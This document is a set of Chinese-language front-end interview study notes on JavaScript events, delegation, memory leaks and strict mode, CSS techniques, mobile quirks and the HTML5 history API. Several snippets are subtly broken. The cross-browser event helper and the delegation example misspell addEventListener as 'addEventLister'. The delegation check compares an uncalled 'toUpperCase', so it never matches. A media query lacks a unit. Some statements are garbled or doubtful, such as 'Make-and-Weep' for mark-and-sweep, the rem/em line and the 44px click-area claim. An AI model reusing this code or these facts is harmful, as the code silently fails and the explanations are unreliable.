ECMAScript 5引入了严格模式(strict mode)的概念，严格模式对正常的JavaScript语义做了一些修改。

1. 首先，严格模式消除了JavaScript的一些silent errors，通过改变它们来抛出一些错误；
2. 第二，严格模式修复了JavaScript引擎难以执行优化的错误；
3. 第三，严格模式禁用了一些ECMAScript的未来版本中可能会定义的一些语法。

#### 开启严格模式

严格模式可以应用到整个script标签中，在顶部添加:

```js
"use strict";
```

也可以指定函数在严格模式下执行:

```js
function doSomething(){
  "use strict";
  //函数体
}
```

#### 严格模式举例

+ 严格模式下无法再意外创建全局变量 比如`"use strict"; mist = 17`会抛出ReferenceError错误。
+ 严格模式下会引起silently fail的赋值操作都会抛出异常。
+ 严格模式下，试图删除不可删除的属性时会抛出异常(之前这种操作不会产生任何效果)。
+ 严格模式下要求函数的参数名唯一。比如，`function sum(a,a,c){...}`会抛出异常
+ 严格模式禁止八进制数字语法
+ 等等

参考[严格模式](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Strict_mode)

---

## 文本不换行

问题是这样描述的，如果有一个被`<div>`包裹的文本，如何做到取消自动换行。方式是使用`white-space`属性。这个属性有一下几个属性值:

+ normal: 默认，空白会被浏览器忽略
+ pre: 空白会被浏览器保留
+ nowrap: 文本不会换行，直到遇到`<br>`标签

然后溢出的文本可以用`overflow: hidden`处理。

```css
div {
  width: 200px;
  height: 200px;
  white-space: nowrap;;
  overflow: hidden;
}
```

---

## 事件冒泡和事件流

事件流描述的是从页面中接收事件的顺序。事件冒泡是(event bubbling)IE提出来的，**即事件 开始时由最具体的元素接收，然后逐级向上传播到较为不具体的节点**。比如点击一个`div`，冒泡顺序是`div -> body -> html -> document`。有些浏览器会直接冒泡到`window`对象。

“DOM2级事件”规定的事件流包括三个阶段: 事件捕获阶段、处于目标阶段和事件冒泡阶段。和上面这个例子类似，点击一个`div`。首先发生的是事件捕获，为截获事件提供机会，这个阶段从  `document -> html -> body`就停止了。然后是实际的目标接收事件，事件在`div`上发生，并在事件处理中被看成是冒泡阶段的一部分。最后冒泡阶段对事件做出响应，事件按照`div -> body -> html -> document`传回文档。

#### 如何取消事件的冒泡

触发 DOM 上的某个事件时，会产生一个事件对象 event，这个对象中包含着所有与事件有关的信息。`bubbles` 属性 **表明事件是否冒泡**。 其中有个函数，`event.stopPropagation()` 可以取消事件的进一步捕获和冒泡，前提是 bubbles 为 true。在 IE 中，event 是作为 window 对象的一个属性存在的。有一个 `cancelBubble()` 方法可以取消事件冒泡。

如果是取消特定元素的默认行为，可以使用 `preventDefault()` 来实现。

---

## 事件代理或委托

在这之前，先说一下事件处理程序。分为三种，一种是HTML事件处理程序。

比如这种

```html
<input type="button" value="Click me" onclick="showMessage()"/>
<script>
  function showMessage(){
    //do something
  }
</script>
```

第二种是DOM0级事件处理函数，就是将一个函数赋值给一个事件处理程序的属性。每个元素都有自己的事件处理程序事件。如:

```js
var btn = document.getElementById("myBtn");
btn.onclick = function() {
  // do something
}
```

第三种就是DOM2级事件处理程序。定义了两个方法`addEventListener()`和`removeEventListener()`。接收三个参数: 要处理的事件名、作为事件处理程序的函数和一个布尔值。布尔值最好是`false`，否则表示在捕获阶段调用处理函数。如

```js
var btn = document.getElementById("myBtn");
btn.addEventListener("click", function(){
  //do something
}, false);

/* 这样写最好了
var btn = document.getElementById("myBtn");
var handler = function (){
  do something;
}
btn.addEventListener("click", handler, false);

btn.removeEventListener("click",handler,false);
*/
```

但是IE非要不一样。使用`attachEvent()`和`detachEvent()`，只接受两个参数: 事件处理程序名称和事件处理程序函数。

```js
var btn = document.getElementById("myBtn");
btn.attachEvent("onclick", function(){
  //do something
});
````

对于跨浏览器，最好将它们用一个对象封装起来。

```js
var EventUtil = {
  addHandler: function (element, type, handler){
    if (element.addEventLister){
      element.addEventLister(type, handler, false);
    }else if (element.attachEvent){
      element.attachEvent("on"+type, handler);
    }else {
      element["on"+type] = handler;
    }
  },
  removeHandler: function (element,type, handler){
    if (element.addEventLister){
      element.removeEventLister(type, handler, false);
    }else if (element.attachEvent){
      element.detachEvent("on"+type, handler);
    }else {
      element["on"+type] = null;
    }
  }
}
```

#### 事件代理/委托

事件代理/委托的意思就是，将自己要做的事情交给别人来做。即，某个事件A是元素a的事件，但是该事件转交给元素b(主要是父元素)来监听并完成。举个例子，事件监听器只能绑定在当前DOM已有的元素上，比如这样的结构:

```html
<ul>
  <li></li>
  <li></li>
  <li></li>
  <li></li>
</ul>
```

我们要向所有的`<li>`添加事件，尤其是实际需求中，往往渲染出来的元素也需要监听事件。这种情况下，我们就可以实现一个事件代理，即通过`<ul>`去代理`<li>`的事件。

使用的方法就是target属性，通过 event 这个对象将 target 传进去。这个属性永远指代最精确的那个对象(元素)。

```js
var ul = document.querySelector('ul');
ul.addEventLister("click", e => {
  if (e.target && e.target.nodeName.toUpperCase == 'LI'){
    // do something
  }
}, false);
```

优点:

+ 减少处理时间，因为处理程序需要的 DOM 引用更少，所花的时间也更少
+ 整个页面占用的内存空间更少

参考: [事件代理 delegate 的实现](https://zhuanlan.zhihu.com/p/27554181)  [手写事件模型及事件代理/委托](http://www.w3cmark.com/2016/439.html)  [JavaScript事件委托原理&实现](JavaScript事件委托原理&实现)

---

## JavaScript 的内存泄露

内存泄露指的就是**一块被分配的内容既不能被回收，也不被使用**。也就是说局部变量被使用后，无法被垃圾回收器回收，就会造成内存泄露。

### JavaScript 的内存管理

Make-and-Weep (标记和清除)

这是最常见的现代浏览器进行垃圾回收的方式。方法是，垃圾收集器在运行时给存储在内存中的所有变量都加上标记，然后，去掉进入“环境”中的变量和被环境中变量引用的变量的标记。如果之后这些变量被加上了标记，就被视为准备删除的变量。

还有一种回收方式是 reference counting，不常用。

### 常见的造成内存泄露

#### 意外的全局变量

浏览器对未被声明的变量的处理是，在全局对象内创建一个新的变量，对浏览器而言，就是 window。(非严格的说起来，未使用 var 声明的变量算是 window 的一个属性，所以可以使用 delete 删除)

> 怎么去理解未被声明的变量会造成内存泄露呢？因为使用了 var 声明的全局变量虽然是全局的，但是在页面被卸载之后会被垃圾回收期清除，而未使用 var 声明的则会一直存在。是这样解释吗？？？有待讨论。

这类错误，可以添加 `use strict` 进行防止。

#### 被遗忘的计时器或回调函数

JavaScript 经常使用 setInterval 函数。如果该计时器不再需要的时候，计时器应该被回收。老版本的 IE 无法检测 DOM 节点和 JavaScript 代码之间的循环引用，所以会导致内存泄漏。现代浏览器一般是没有问题了。

#### 脱离 DOM 的引用

#### 闭包

闭包会保存其外部函数的作用域，所以会造成内存泄露。

### 检测内存占用的工具

timeline 和 profiles

参考： [4 Types of Memory Leaks in JavaScript and How to Get Rid Of Them](https://auth0.com/blog/four-types-of-leaks-in-your-javascript-code-and-how-to-get-rid-of-them/)

中文翻译： [4种JavaScript内存泄漏浅析及如何用谷歌工具查内存泄露](https://github.com/wengjq/Blog/issues/1)

---

## 清除浮动

当容器的高度为 auto 时，且容器的内容中有浮动的元素。因为浮动元素不占据空间，所以容器的高度不能自动伸长以适应内容的高度，使得内容溢出到容器外面而影响布局。这种现象叫做浮动溢出，所以这种情况通常使用 CSS 处理，就叫 CSS 清除浮动。

下面的栗子就是这种情况：

![内容溢出到外面了](https://segmentfault.com/image?src=http://images.cnitblog.com/blog/349636/201310/23224343-9668661a8f63445699e0a8c24a64662b.jpg&objectId=1190000004865198&token=554e24d525d3a82a18721e9d6489337f)

```html
  <head>
    <meta charset="utf-8">
    <title>clear float</title>
    <style media="screen">
      .main {
        background-color: yellow;
        border: solid 1px black;
      }
      .main img {
        float: right;
      }
      .clear {
        clear: both;
      }
    </style>
  </head>
  <body>
    <div class="main">
      <img src="http://via.placeholder.com/150x150" alt="">
      <p>pork c sirlfsafdsafsadfsafsafsfoin rihort loin. Corned bf chicken cupim beef tenderloin, biltong ham turducken shankle
    </p>
    <div class="clear"></div>
    </div>
  </body>
```

### 使用带 clear 属性的空元素

在浮动元素后使用一个空元素如 `<div class="clear"></div>`，并在 CSS 中赋予`.clear{clear:both;}` 属性即可清理浮动。如上面。

优点：简单，代码少，浏览器兼容性好。
缺点：需要添加大量无语义的 html 元素，代码不够优雅，后期不容易维护。

### 使用 overflow: hidden;

overflow: hidden; 是 CSS 的诡异表现之一，它能够强制外层容器扩大，以包含浮动的元素。一般说来，这种方法是最好的，可是，容器中绝对定位的元素会消失。

```html
  <head>
    <meta charset="utf-8">
    <title>clear float</title>
    <style media="screen">
      .main {
        background-color: yellow;
        border: solid 1px black;
        overflow: hidden;
      }
      .main img {
        float: right;
      }
    </style>
  </head>
  <body>
    <div class="main">
      <img src="http://via.placeholder.com/150x150" alt="">
      <p>pork c sirlfsafdsafsadfsafsafsfoin rihort loin. Corned bf chicken cupim beef tenderloin, biltong ham turducken shankle
    </p>
    </div>
  </body>
```

还有其他的方法，可参考 [CSS-清除浮动](https://segmentfault.com/a/1190000004865198)

---

## Cookies 和 Sessions

两者都是用于状态管理的。

cookie 是保存再浏览器中的数据，通过每次请求发送到服务端。

session 是保存在服务器端，与给定用户相关联的的一个数据集合。session 是基于 cookie 来工作的。

cookie 不是很安全，可能被篡改；另外，HTTP 对 cookie 的数量和大小有限制。

而 session 不易于在很多的服务器中进行共享。

> 参考 [深入理解cookie与session](http://blog.csdn.net/j903829182/article/details/39855221)  [What is the difference between Sessions and Cookies in PHP?](https://stackoverflow.com/questions/6339783/what-is-the-difference-between-sessions-and-cookies-in-php)

---

## 隐藏页面元素的 CSS 方法

+ display: none; //不占据空间，无法点击
+ visibility: hidden; //占据空间，无法点击
+ opacity: 0; //占据空间，可以点击

重点1: display:none 和 visibility: hidden 的区别

+ 前者不占据空间，后者占据空间
+ 前者隐藏产生 reflow 和 repaint，后者没有这个问题
+ 前者一旦父节点应用了 display: none，父节点和子孙节点无一幸免，后代元素无论怎样想尽办法都无能为力。虽然后者在父节点上应用 visibility:hidden，则其子孙后代也会全部不可见，但是一旦某个子孙元素应用 visibility: visible，则该子孙元素就显现出来了。

重点2: visibility:hidden 和 opacity: 0的区别

+ 前者无法响应点击事件，后者可以。

参考: [您可能不知道的CSS元素隐藏“失效”以其妙用](http://www.zhangxinxu.com/wordpress/2012/02/css-overflow-hidden-visibility-hidden-disabled-use/)

---

## 设计一个点击回到顶部的方法

最简单的方法是直接使用 锚，但不是很好的方法。

```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>Scroll Top</title>
  </head>
  <style media="screen">
    #btn {
      position: fixed;
      bottom: 0px;
      right: 0px;
      display: none;
    }
    .pictures {
      max-width: 1190px;
      margin: 0 auto;
    }
  </style>
  <body>
    <div class="pictures">
      <img src="./1.png" alt="">
      <img src="./1.png" alt="">
      <img src="./1.png" alt="">
    </div>
    <div class="scrolltop">
      <a href="#" id="btn" title="Return Top">Return Top</a>
    </div>
    <script type="text/javascript">
      window.onload = function(){
        var btn = document.getElementById('btn');
        var timer = null;
        var isTop = true;  //触发scroll 就停止

        btn.onclick = function(event) {
          event.preventDefault();   // 阻止链接的默认行为
        };

        var handler = function () {
          var scrollHeight = document.documentElement.scrollTop || document.body.scrollTop; // 获得滚动条高度
          if (scrollHeight >= 400){
            btn.style.display = 'block';
          }else {
            btn.style.display = 'none';
          }

          if (!isTop) {
              clearInterval(timer);
          }
          isTop = false;

        }
        window.addEventListener ("scroll", handler,false);
        btn.addEventListener("click",function(){
          timer = setInterval(function(){
            var scro = document.documentElement.scrollTop || document.body.scrollTop;
            var speed = Math.floor(-scro/4);
            document.documentElement.scrollTop = document.body.scrollTop = scro + speed;

            isTop = true;

            if (scro == 0){
              clearInterval(timer);
            }
          },100);
        },false)
      }
    </script>
  </body>
</html>
```

此外，可以使用 jQuery 的 animate() 方法。就好比这样:

```js
(function (btn) {
        $(window).scroll(function(){
            if ($(window).scrollTop()>400){
                btn.fadeIn(400);
            } else {
                btn.fadeOut(600);
            }
        });//按钮消失和出现
        btn.click(function(){
            $('body,html').animate({scrollTop:0},1000);
        });
    })($('#gotop')); //回到顶部
```

参考: [用Javascript实现回到顶部效果](http://www.cnblogs.com/foodoir/p/5885174.html)

---

## 稳定排序和不稳定排序

稳定排序，通俗地来讲，就是保证排序前两个相等的数其在序列的前后位置顺序和排序后它们两个的前后位置顺序相同。

+ 冒泡排序: 稳定
+ 插入排序: 稳定
+ 归并排序: 稳定
+ 选择排序: 不稳定
+ 快速排序: 不稳定
+ 希尔排序: 不稳定
+ 堆排序: 不稳定

---

## 移动端和 pc 端的区别归纳

#### click 和 touch 事件

移动端使用 touch 来代替 click 事件。触发的步骤是: touchstart -> touchmove -> touchend。而移动端并不是不能响应 click 事件，正常情况下，也就是说当用手去触碰屏幕时，要过 300ms 左右才会触发 mousedown 事件。也就是表现过来，移动页面的 click 反应比 pc 端要慢上 300 毫秒左右。这样设计的目的是，在移动端上 **双击**代表放大页面，为了确认用户是单击还是双击，因此有了这黄金 300ms。

#### 需要设置 viewport

```html
<meta name="viewport" content="width=device-width, initial-scale=1.0">
```

+ content = "width=device-width" 表示 viewport 宽度是 设备宽度。
+ initial-scale=1.0 来控制屏幕全屏显示，且不被缩放。

#### rem/em

rem 相对于文档的 根元素(html) 的 font-size。相对于父元素的 font-size。

#### -webkit-appearance: none

iphone 上 submit 的按钮 bug。iphone 上的控件 `<button>、<input>` 之类的。若不写 `-webkit-appearance: none`，就是做好了控件的样式，iphone 还是会使用自身默认的样式。

#### 手机端字体显示

iphone 上最小字体显示可以显示 10px，安卓大部分手机由于不是高清显示屏，像素不够只能最小显示 12px 的字体。

#### iphone6 和 iphone 6s 的三倍屏

则尺寸需要按照设计稿的 三分之一 进行计算；如果是两倍屏，比如 iphone 5，就按照设计稿尺寸的 二分之一 计算。

#### 设备分界点的阈值

按照 Bootstrap，分为 576px、768px、992px、1200px。写法:

```css
@media screen and (min-width: 992px) and (max-width: 1199){
  /*...*/
}
```

#### 最小点击区域

移动端由最小点击识别区，即为 44px*44px。元素大小低于这个值被点击是不会触发 click 事件的。

#### 一像素边框的问题

一像素边框的问题也是由于 iphone 的二倍/三倍屏 造成的，使得一像素的边框用2倍渲染，造成视觉上不太像 1px 边框的样子。我们无法设置 boder-width 的边框设置为 0.5px，浏览器不会支持。所以对于我们设计的目的，就是希望通过什么方式把 1px 的缩放到 0.5px。可以是用 `transform` 属性。

```css
div{
    height:1px;
    background:#000;
    -webkit-transform: scaleY(0.5);
    -webkit-transform-origin:0 0;
    overflow: hidden;
}
```

#### 一行和多行文本溢出

一行文本溢出:

```css
.oneline{
overflow:hidden;
white-space:nowrap;
text-overflow: ellipsis;
```

多行文本溢出:

```css
.multiline{
display:-webkit-box !important;
overflow:hidden;

text-overflow:ellipsis;
word-break:break-all;

-webkit-box-orient:vertical;
-webkit-line-clamp:2;
}
```

#### Tap 事件和点透问题

在 touchstart、touchend 时记录时间、手指位置，并进行比较，如果手指位置为同一位置（或允许移动一个非常小的位移值）且时间间隔较短（一般认为是200ms），且过程中未曾触发过 touchmove，即可认为触发了手持设备上的 click，一般称它为 tap 事件。tap 事件的点透问题也是因为 click 事件在移动端的 300ms 左右的延迟引发的。在蒙层触发 tap 事件之后，蒙层如果消失，随后 click 就会触发被蒙层遮盖的下方的可以响应 click 事件的元素。

+ 使用缓动动画，过渡 300ms 的延迟
+ 都使用 `tap` 事件，避免使用 `click` 事件。
+ 或者在蒙层监听 `touchend` 时添加 `e.preventDefault()` 取消 click 事件。

参考:

+ [Hello，移动WEB](http://www.imooc.com/learn/494)
+ [移动端前端开发与PC端比有哪些不同？](https://www.zhihu.com/question/34364365)
+ [移动web 1像素边框 瞧瞧大公司是怎么做的](https://segmentfault.com/a/1190000007604842)
+ [移动端的touch click事件的理解+点透](http://www.jianshu.com/p/dc3bceb10dbb)
+ [移动端页面开发，到底用Click多还是Touch事件多？](https://segmentfault.com/q/1010000008376883?_ea=1643695)

---

## CSS3 新特性

### 弹性盒 flex

### 边框

#### border-radius

添加圆角边框。

```css
div {
  border: 1px solid;
  border-radius: 30px;
  /*border-radius: 10px 15px 20px 30px / 20px 30px 10px 15px*/
}
```

设置顺序分别是左上、右上、右下、左下的逆时针顺序。`/` 分割水平半径和垂直半径。

#### box-shadow

边框阴影。语法:

```css
{
  box-shadow: [inset] x-offset y-offset blur-radius extension-radius spread-radiuscolor;
}
```

分别是: [投影方式(内投影/外投影)] 水平偏移量 垂直偏移量 阴影模糊半径 阴影扩展半径 阴影颜色

#### border-image

添加边框图片。

### CSS3 背景

#### background-size

更改背景的尺寸。

#### background-origin

规定背景图片的定位区域，包括 content-box、padding-box、border-box。

### CSS3 文本和字体

#### text-shadow

给文本添加阴影。分别是水平阴影、垂直阴影、模糊距离以及阴影的颜色。

```css
{
  text-shadow: 5px 5px 5px #FF0000;
}
```

#### text-wrap

设置区域内的自动换行。

#### @font-face

可以添加自定义字体。

### CSS3 transform

+ translate(x,y): 元素根据给定的 x 和 y 值在水平和垂直方向移动。x 正值向右移动，y 正值向下移动。
+ rotate(): 控制元素顺时针旋转给定的角度。为正值，元素顺时针旋转。
+ scale(): 根据给定的宽度 (X轴) 和高度 (Y轴)，控制元素的尺寸的增加，减少。
+ skew(): 根据给定的水平线 (X轴) 和垂直线 (Y轴) 设置元素翻转给定的角度。
+ matrix(): 把所有 2D 转换方法组合在一起。
+ rotateX(): 3D 转换绕 x 轴以给定度数进行旋转。
+ rotateY(): 3D 转换绕 y 轴以给定度数进行旋转。

### CSS3 transition

为元素添加过渡效果。语法:

```css
{
  transition : transition-property | transition-duration | transition-timing-function | transition-delay;
}
```

transition 是四个属性的简写方式:

+ transition-property: 规定应用过渡的 CSS 属性的名称
+ transition-duration: 过渡花费的时间
+ transisition-timing-function: 规定过渡的时间曲线。默认是 ease
+ transisition-delay: 规定过渡效果何时开始。默认是 0

### CSS3 @keyframes

通过 @keyframes 规则来创建动画。动画属性是 animation，是除了 animation-play-state 属性所有动画属性的简写方式。语法:

```css
{
  animation : animation-name | animation-duration | animation-timing-function | animation-delay | animation-iteration-count | animation-direction
}
```

分别是:

+ animation-name: @keyframes 动画的名称
+ animation-duration: 规定动画完成一个周期所花费的秒或毫秒
+ animation-timing-function: 规定动画的速度曲线。默认是 ease
+ animation-delay: 规定动画何时开始。默认是 0
+ animation-iteration-count: 规定动画被播放的次数。默认是 1
+ animation-direction: 规定动画是否在下一周期逆向地播放。默认是 normal

animation-play-state 属性规定动画正在运行或暂停。默认是 running"。

举例:

```css
@keyframes myfirst{
  from {background: red;}
  to {background: yellow;}
  /*
  0%   {background: red;}
  25%  {background: yellow;}
  50%  {background: blue;}
  100% {background: green;}
  */
}
div{
  animation: myfirst 5s;
}
```

### CSS3 文本多列

column-count 属性规定元素应该被分隔的列数。

column-gap 属性规定列之间的间隔。

column-rule 属性设置列之间的宽度、样式和颜色规则。

### box-sizing

参考: 

+ [CSS3 新特性学习](http://www.jianshu.com/p/d61bf4f36235)
+ [10 CSS3 Properties you Need to be Familiar With](https://code.tutsplus.com/tutorials/10-css3-properties-you-need-to-be-familiar-with--net-16417)

---

## HTML5 的 history API

ajax 可以实现页面的无刷新操作，但是也造成了另外的问题，就是无法前进和后退。举个例子，视频下面的评论而言，使用 ajax 是非常合适的，但是，在翻到十几页的时候，你发现一个写得稍长，但非常有趣的评论。正当你想要停下滚轮细看的时候，手残按到了F5。然后，页面刷新了，评论又回到了第一页，所以你又要重新翻一次。

所以，HTML5 history API 就是为了解决这一问题而提出来的。包括两个方法: `history.pushState()` 和 `history.replaceState()`，还有一个事件 `window.onpopstate`。

`history.pushState(stateObject, title, url)`，该方法新生成一条历史纪录，方便用浏览器的后退和前进来导航。
`history.replaceState()` 和 `history.pushState()` 方法基本相同，区别就是前者不会生成历史纪录，而是将当前历史记录替换掉。

上述两个方法通常搭配 `popstate` 来使用，该事件再浏览器取出历史记录并加载时触发。

参考：

+ [HTML5 history API，创造更好的浏览体验](https://segmentfault.com/a/1190000002447556)
+ [ajax与HTML5 history pushState/replaceState实例](http://www.zhangxinxu.com/wordpress/2013/06/html5-history-api-pushstate-replacestate-ajax/)